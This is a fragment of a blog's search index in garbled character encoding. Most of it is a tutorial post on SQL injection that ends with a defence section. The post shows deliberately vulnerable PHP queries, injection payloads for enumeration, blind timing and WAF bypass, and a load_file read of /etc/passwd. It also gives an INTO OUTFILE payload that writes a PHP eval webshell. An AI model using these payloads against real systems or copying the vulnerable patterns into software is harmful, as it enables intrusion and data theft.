class="line"> loginç±»å‹Ticket:</span><br><span class="line"><span class="bullet">  1.</span> ç™»é™†æˆåŠŸåæ ‡å¿—Ticket</span><br><span class="line"><span class="bullet">  2.</span> Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;LT-&quot;å¼€å¤´ </span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code"> ticket-grantingç±»å‹: </span></span><br><span class="line"><span class="code">  1. Verifyè®¤è¯æˆåŠŸåäº§ç”Ÿçš„Ticket</span></span><br><span class="line"><span class="code">  2. Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;TGT-&quot;å¼€å¤´</span></span><br><span class="line"><span class="code">  3. TicketéªŒè¯æ¬¡æ•°é™åˆ¶ï¼Œæœ‰æ•ˆæœŸç­‰å®‰å…¨æ€§</span></span><br><span class="line"><span class="code">  4. å°½é‡å†åŠ å¯†ä¸€æ¬¡Ticket </span></span><br><span class="line"><span class="code"></span></span><br><span class="line"><span class="code"> ticket-granting cookieç±»å‹:</span></span><br><span class="line"><span class="code">  1. Verifyè®¤è¯æˆåŠŸåäº§ç”Ÿçš„Ticket, ä¿å­˜åœ¨Cookieä¸­(åŒäºŒçº§åŸŸåä¸‹ä½¿ç”¨cookie)</span></span><br><span class="line"><span class="code">  2. Ticketå­—ç¬¦ä¸²å¿…é¡»ä»¥&quot;TGC-&quot;å¼€å¤´</span></span><br><span class="line"><span class="code">  3. Cookieè·¯å¾„ä¸¥æ ¼é™åˆ¶ ï¼ˆå¤šç”¨äºåŒäºŒçº§åŸŸåå…¶ä»–ç«™ç‚¹ï¼‰</span></span><br><span class="line"><span class="code">  4. Cookieä¸­å¯èƒ½åŒ…å«ticket-grantingçš„ticket(ä¸æ¨è)</span></span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="#å‚è€ƒ"></a>#å‚è€ƒ</h2><ol><li>[CASåè®®ç»†èŠ‚] <a href="https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol-Specification.html">https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol-Specification.html</a>  </li><li>[CASåè®®åŸç†] <a href="https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol.html">https://apereo.github.io/cas/4.2.x/protocol/CAS-Protocol.html</a></li><li>[CASå®¢æˆ·ç«¯å®ç°] <a href="https://apereo.github.io/cas/4.2.x/integration/CAS-Clients.html">https://apereo.github.io/cas/4.2.x/integration/CAS-Clients.html</a></li><li>[CASåŸç†è§£æ] <a href="https://juejin.im/post/5a002b536fb9a045132a1727">https://juejin.im/post/5a002b536fb9a045132a1727</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> protocol </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cas </tag>
            
            <tag> sso </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How SQLi ATTACK</title>
      <link href="2018/01/21/How-SQLi-ATTACK/"/>
      <url>2018/01/21/How-SQLi-ATTACK/</url>
      
        <content type="html"><![CDATA[<p>  SQLè¯­è¨€æ˜¯å®ç°æ•°æ®åº“æ“ä½œçš„ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œæ•°æ®åº“è§£æå™¨é€šè¿‡è§£æSQLå®ç°å¯¹æ•°æ®çš„å¢åˆ æ”¹æŸ¥ç­‰æ“ä½œã€‚ç›®å‰ä¸»æµæ•°æ®åº“æœ‰MySQLã€Oracleã€MSSQLã€Postgresqlã€MongoDBç­‰ç­‰ã€‚Webæ¶æ„é‡‡ç”¨è„šæœ¬è¯­è¨€+æ•°æ®åº“çš„å½¢å¼æ„å»ºæœåŠ¡ï¼ŒSQLiå°±å‡ºç°åœ¨è„šæœ¬è¯­è¨€é€»è¾‘å¤„ç†ä¸­ã€‚è€ŒSQLi(SQL Injection)æ”»å‡»å·²ç»å»¶ç»­äº†åå¤šå¹´ä¹‹ä¹…ï¼Œå†å¹´å æ®OWASP Top10æ¦œé¦–ã€‚SQLiåœ¨ä¼ ç»Ÿæ¡†æ¶ä¸­å‡ºç°çš„é¢‘ç‡æä¸ºé«˜ï¼Œè€Œç°ä»£å½¢å¼Webæ¡†æ¶ä»åº•å±‚å±è”½äº†SQLiå‡ºç°çš„å¯èƒ½æ€§ã€‚</p><h2 id="SQLåŸºç¡€"><a href="#SQLåŸºç¡€" class="headerlink" title="#SQLåŸºç¡€"></a>#SQLåŸºç¡€</h2><p>SQLè¯­è¨€åˆ†ä¸ºDDLã€DMLã€DCLã€TCLç­‰ï¼Œå…¶ä¸­DMLè¯­è¨€æ˜¯ç›®å‰ä½¿ç”¨æœ€é«˜çš„ã€‚<br>DDLè¯­è¨€ï¼ˆData Definition Languageï¼‰</p><ul><li>create</li><li>alter</li><li>drop</li><li>truncate</li><li>comment</li><li>rename</li></ul><p>DMLè¯­è¨€(Data Manipulation Language)</p><ul><li>select</li><li>insert</li><li>update</li><li>delete</li><li>merge</li><li>call</li><li>explain plan</li><li>lock table</li></ul><p>DCLè¯­è¨€(Data control language)</p><ul><li>grant</li><li>revoke</li></ul><p>TCLè¯­è¨€(Transcation control language)</p><ul><li>commit</li><li>savepoint</li><li>rollback    </li><li>set transcation</li></ul><p>ç”±äºæƒé™çš„åŸå› ï¼ŒSQLiå¸¸ä½¿ç”¨çš„DDL+DMLå¯¹ç³»ç»Ÿåç«¯æ•°æ®åº“æ“ä½œã€‚ä¸€ä¸ªåŸºç¡€SQLiçš„äº§ç”Ÿæ˜¯åç«¯ç³»ç»Ÿæœªå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œä½¿ç”¨æˆ·è¾“å…¥æ•°æ®ä¸ä¸šåŠ¡SQLè¯­å¥æ‹¼æ¥ï¼Œå¯¼è‡´äº§ç”Ÿéæ³•æ“ä½œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//ä¸šåŠ¡é€»è¾‘</span></span><br><span class="line">   <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">   <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">   <span class="comment">//å­—ç¬¦å‹æ³¨å…¥</span></span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;select * from user where username=&#x27;<span class="subst">&#123;$name&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">   <span class="comment">//æ•°å­—å‹æ³¨å…¥</span></span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;select * from user where id = &#x27;<span class="subst">&#123;$id&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ”»å‡»Payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">  http:<span class="comment">//127.0.0.1/index.php?name=admin&#x27;;select @@version#</span></span><br><span class="line">  http:<span class="comment">//127.0.0.1/index.php?id=1;select @@version#</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">ä¸€ã€åç«¯æ•°æ®åº“ç§ç±»æ¯•ç«Ÿå¤šï¼Œéœ€è¦è¯†åˆ«æ•°æ®åº“ç±»å‹ï¼Œä¾æ®ä¸åŒæ•°æ®åº“ç‰¹æ€§åŒºåˆ†</span><br><span class="line">* @@versionå˜é‡</span><br><span class="line">* ç‰¹å®šå‡½æ•°</span><br><span class="line">- MySQL =&gt; last_insert_id()</span><br><span class="line">- MSSQL =&gt; @@rowcount </span><br><span class="line">- Oracle =&gt; BITAND(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">* å­—ç¬¦ä¸²æ‹¼æ¥å¤„ç†ä¸åŒ</span><br><span class="line">- MySQL/Postgresql =&gt; ç©ºæ ¼æ‹¼æ¥</span><br><span class="line">- MSSQL =&gt; åŠ å·æ‹¼æ¥</span><br><span class="line">- Oracle =&gt; ||ç¬¦åˆæ‹¼æ¥</span><br><span class="line"></span><br><span class="line">äºŒã€Union/Order byç‰¹æ€§è·å–åˆ—æ•°</span><br><span class="line">```php</span><br><span class="line"><span class="comment">//æŸ¥è¯¢åˆ—è¡¨æ•°ç›®</span></span><br><span class="line">index.php?id=<span class="number">12</span>+select+<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,...</span><br><span class="line"><span class="comment">//å­—ç¬¦æ˜¾ç¤ºä½</span></span><br><span class="line">index.php?id=<span class="number">12</span>+order+by+<span class="number">1</span></span><br><span class="line">````</span><br><span class="line">ä¸‰ã€è·å–æ•°æ®åº“è¡¨å</span><br><span class="line">```php</span><br><span class="line">MSSQL:</span><br><span class="line">æ•°æ®åº“åï¼šmaster..sysdatabases</span><br><span class="line">select name <span class="keyword">from</span> master..sysdatabases;</span><br><span class="line"></span><br><span class="line">MySQL:</span><br><span class="line">æ•°æ®åº“åï¼šinformation_schema.schemata</span><br><span class="line">è¡¨åï¼šinformation_schema.tables</span><br><span class="line">æƒé™: information_schema.schema_privileges</span><br><span class="line">è¡¨åï¼šmysql.dbï¼ˆç®¡ç†æƒé™ï¼‰</span><br><span class="line">select SCHEMA_NAME <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line">select TABLE_NAME <span class="keyword">from</span> information_schema.tables;</span><br><span class="line">select COLUMN_NAME <span class="keyword">from</span> information_schema.columns where TABLE_NAME=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Oracle:</span><br><span class="line">ç”¨æˆ·è¡¨: user_tables</span><br><span class="line">è¡¨ï¼šall_tables</span><br><span class="line">æƒé™è¡¨: user_sys_privs</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è‡³æ­¤ä¸€ä¸ªåŸºç¡€SQLiæ”»å‡»è¿‡ç¨‹å®Œæ¯•ï¼Œåœ¨å¤æ‚çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼ŒSQLiå¹¶ä¸å±€é™äºselectå½¢å¼çš„æ³¨å…¥ï¼Œè¿˜æœ‰insertã€updateã€deleteç­‰å½¢å¼çš„æ³¨å…¥åœºæ™¯ã€‚ç›¸å¯¹äºselectæ¥è¯´æ›´ä¸ºå¤æ‚ï¼Œä¸å¯è§ã€éš¾æ“ä½œã€‚</p><p>INSERTæ³¨å…¥çš„å¥‡æ€å¦™æƒ³ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;insert into user(username, password)values(&#x27;&quot;</span>.<span class="variable">$_GET</span>[name].<span class="string">&quot;&#x27;, password(&#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&#x27;))&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAYLOAD</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;x&#x27;</span>,(select @@version)--</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯æ§ç‚¹æ’å…¥ç‰¹å®šSQLï¼Œå¸¸è§äºä¸ªäººä¿¡æ¯ç¼–å†™ä¸šåŠ¡ä¸­</span></span><br></pre></td></tr></table></figure><p>UPDATEæ³¨å…¥çš„å¥‡æ€å¦™æƒ³:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;update user set name=&#x27;&quot;</span> .<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]. <span class="string">&quot;&#x27; where id=1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æœ¬è´¨ä¸insertç›¸åŒ</span></span><br></pre></td></tr></table></figure><p>DELETEæ³¨å…¥çš„å¥‡æ€å¦™æƒ³:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;delete from user where username=&#x27;<span class="subst">&#123;$_GET[&#x27;name&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAYLOAD</span></span><br><span class="line">name=admin<span class="string">&#x27;+union+select+if(current_user()=&#x27;</span>root<span class="string">&#x27;, sleep(3), sleep(10));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//è¯¥ç±»å‹æ³¨å…¥æµ‹è¯•ç¹ç</span></span><br></pre></td></tr></table></figure><p>SQLæ³¨å…¥è¿˜æœ‰ä¸€ç§ç›²æ³¨çš„åœºæ™¯ï¼Œæ³¨å…¥æ“ä½œä¸ä¼šå›æ˜¾åœ¨é¡µé¢ä¸­ã€‚é€šè¿‡SLEEP/BENCHMARKå‡½æ•°åˆ©ç”¨æ—¶é—´å“åº”çš„ä¸åŒæ¨æ–­æ³¨å…¥ç»“æœã€‚</p><h2 id="SQLç¼–ç "><a href="#SQLç¼–ç " class="headerlink" title="#SQLç¼–ç "></a>#SQLç¼–ç </h2><p>ç”±äºWAFï¼ˆweb application firewallï¼‰çš„å‡ºç°ï¼Œçº¯åŸç”Ÿçš„SQLi Payloadä¼šè¢«ç³»ç»Ÿæ‹¦æˆªï¼Œä¸ºäº†bypass wafå°±éœ€è¦å¯¹SQLè¯­å¥è¿›è¡Œå„ç§å˜å½¢ã€‚</p><ul><li>å¤§å°å†™ç¼–ç ï¼ˆç›®å‰æ— æ•ˆæœï¼‰</li><li>URLENCODEç¼–ç </li><li>æ³¨é‡Šç¼–ç </li><li>ç‰¹å®šåœºæ™¯å­—ç¬¦æˆªæ–­(å®½å­—èŠ‚æ³¨å…¥)</li><li>ASCIIç </li></ul><p>ç¤ºä¾‹:</p><p>```shell<br>#select @@version<br>index.php?id=1+uni/<strong>/on+sel/</strong>/ect+char(64)+char(64)+char(118)+char(101)+char(114)+char(115)+char(105)+char(110)+char(111)+char(110)#;</p><p>#/etc/passwd<br>index.php?id=1+union+select+load_file(0x2F6574632F706173737764)#</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="xml">## #åŸºäºSQLæ”»å‡»</span></span><br><span class="line"><span class="xml">å¤§å‚çš„SQLiåœºæ™¯åŸºæœ¬å¤æ‚ï¼Œéœ€è¦é€šè¿‡HTTP/DNS/ICMPç­‰ç­‰æ–¹å¼ï¼Œå°†æ‰§è¡Œç»“æœä¼ é€å‡ºæ¥ï¼›æˆ–è€…åˆ©ç”¨æ•°æ®åº“ç‰¹å®šç½‘ç»œæˆ–æ–‡ä»¶å‡½æ•°å†™å…¥webshellï¼Œè¿›è¡Œåå¼¹è¯·æ±‚ã€‚</span></span><br><span class="line"><span class="xml">* OOBæ”»å‡»(out of band)</span></span><br><span class="line"><span class="xml">* ç‰¹æ€§å‡½æ•°å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="xml">* æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"></span><br><span class="line"><span class="xml">ç¤ºä¾‹ï¼š</span></span><br><span class="line"><span class="xml">```php</span></span><br><span class="line"><span class="xml">//å†™å…¥shell</span></span><br><span class="line"><span class="xml">select &#x27;</span><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;c&#x27;</span>]);<span class="meta">?&gt;</span></span><span class="xml">&#x27; into outfile &#x27;/var/www/shell.php&#x27;;</span></span><br></pre></td></tr></table></figure><h2 id="SQLiæ¼æ´æŒ–æ˜"><a href="#SQLiæ¼æ´æŒ–æ˜" class="headerlink" title="#SQLiæ¼æ´æŒ–æ˜"></a>#SQLiæ¼æ´æŒ–æ˜</h2><p>æŒ–æ˜SQLiæ¼æ´åˆ†ä¸ºé»‘ç›’æ¨¡å¼å’Œç™½ç›’æ¨¡å¼ï¼Œå‰è€…é€šè¿‡å·¥å…·æˆ–æ‰‹å·¥ä¸æ–­æµ‹è¯•ï¼Œåè€…é€šè¿‡é˜…è¯»ä¸šåŠ¡ä»£ç åˆ†æå…·ä½“ä»£ç é€»è¾‘ã€‚æ— è®ºé»‘ç™½ç›’æ¨¡å¼ï¼Œèƒ½å‘ç°é—®é¢˜æ–¹å¼éƒ½æ˜¯å¥½æ–¹å¼ï¼Œå¦‚æœä¸šåŠ¡ä»£ç è¾ƒä¸ºå¤æ‚ï¼Œéœ€è¦å€ŸåŠ©åŠè‡ªåŠ¨åŒ–å·¥å…·è¾…åŠ©åˆ†æä»£ç ã€‚</p><p>æºç å®¡è®¡å·¥å…·</p><ul><li>rips</li><li>graudit</li><li>AppScan Source</li></ul><p>ripså®¡è®¡å·¥å…·ç›®å‰å·²æ›´æ–°ä¸ºå•†ä¸šç‰ˆæœ¬ï¼Œè¿™é‡Œå¯ä»¥ç»“åˆgraduitå·¥å…·è¾…åŠ©æŒ–æ˜SQLiæ¼æ´ï¼›ä»£ç å®¡è®¡çš„æ ¸å¿ƒæ˜¯æ ¹æ®ç¼–ç¨‹è¯­è¨€ç‰¹æ€§å‡½æ•°(æ¼æ´å‡½æ•°)åŠå…¥å£å‚æ•°è¿›è¡Œè¿½æº¯åˆ†æã€‚</p><h2 id="SQLié˜²å¾¡"><a href="#SQLié˜²å¾¡" class="headerlink" title="#SQLié˜²å¾¡"></a>#SQLié˜²å¾¡</h2><p>SQLiæ¼æ´å‘ç”ŸåŸå› åœ¨äºè¾“å…¥å‚æ•°ä¸ä¸šåŠ¡SQLç»“åˆå¯¼è‡´å®‰å…¨é£é™©ï¼ŒåŸºç¡€ä¸šåŠ¡æ¥å—çš„å‚æ•°å¤šä¸ºæ•°å­—å‹å’Œå­—ç¬¦å‹ã€‚å¦‚æœå‚æ•°ä¸ºæ•°å­—å‹å‚æ•°ï¼Œå¯é‡‡ç”¨intval()å‡½æ•°å¼ºåˆ¶è½¬æ¢å‚æ•°ä¸ºæ•´å‹ã€‚å¦‚æœå‚æ•°æœªå­—ç¬¦å‹å‚æ•°ï¼Œé€šè¿‡å‚æ•°ç»‘å®šçš„å½¢å¼è§„é¿é£é™©ã€‚</p><p>å¸¸è§„é˜²å¾¡æ–¹å¼:</p><ul><li>intval()/addslashes()</li><li>PDO/MySQLiå‚æ•°ç»‘å®š</li><li>æ­£åˆ™è¿‡æ»¤(ä¸ä¸¥è°¨)</li><li>ä¸‰æ–¹å®‰å…¨ç»„ä»¶ï¼ˆtaint/suhosinï¼‰</li><li>RASPæœºåˆ¶(Runtime Application Self Protection)</li></ul><p>ä¼ ç»Ÿå‹æ¡†æ¶thinkphp/phpcms/dedecms/discuzç­‰æ¡†æ¶åœ¨SQLä½¿ç”¨ä¸Šè¾ƒä¸ºæ··ä¹±ï¼Œç°ä»£å‹æ¡†æ¶Laravel/yii/cakephp/symfonyç­‰æ¡†æ¶åœ¨SQLä¸Šç»Ÿä¸€å°è£…ï¼Œåº•å±‚å¤šä¸ºPDO/MySQLiå‚æ•°ç»‘å®šï¼ŒåŸºæœ¬è§„é¿SQLiçš„é£é™©ã€‚ä½†æ˜¯å„å¤§Webæ¡†æ¶éƒ½æ”¯æŒåŸç”ŸSQLçš„å†™æ³•ï¼ŒSoã€‚ã€‚ã€‚æŒ–ä¸€æŒ–æ€»è¿˜ä¼šæœ‰çš„ :)</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol><li>ã€ŠSQLæ³¨å…¥ä¸é˜²å¾¡ç¬¬äºŒç‰ˆã€‹</li><li>ã€ŠSQLå­¦ä¹ æŒ‡å—ç¬¬äºŒç‰ˆã€‹</li><li>silicæ³¨å…¥æŒ‡å—(ä¹ ç§‘)</li><li><a href="https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf">MySQL OOBæ”»å‡»</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
